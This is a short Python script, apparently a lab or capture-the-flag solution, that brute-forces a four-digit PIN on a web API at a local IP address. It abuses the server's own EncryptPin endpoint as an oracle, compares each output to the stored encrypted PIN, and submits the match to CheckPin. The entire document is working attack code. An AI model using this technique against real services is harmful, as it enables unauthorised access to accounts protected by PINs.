import requests
for i in range(10000):
    mp = requests.post('http://192.168.12.12:5000/api/EncryptPin', json = {'pin': i}).text
    yp = requests.get('http://192.168.12.12:5000/api/EncryptedPin').text
    if mp == yp:
        chp = requests.post('http://192.168.12.12:5000/api/CheckPin', json = {'pin': i}).text
        print(chp)
        break
